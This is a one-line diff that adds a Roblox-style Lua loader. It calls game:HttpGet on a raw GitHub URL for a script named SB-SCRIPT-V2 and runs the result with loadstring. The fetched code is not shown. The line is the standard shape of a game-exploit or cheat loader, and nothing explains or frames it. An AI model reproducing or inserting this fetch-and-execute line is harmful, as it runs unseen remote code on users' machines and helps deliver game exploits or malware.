@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kviks/SB-SCRIPT-V2/refs/heads/main/a.lua"))()
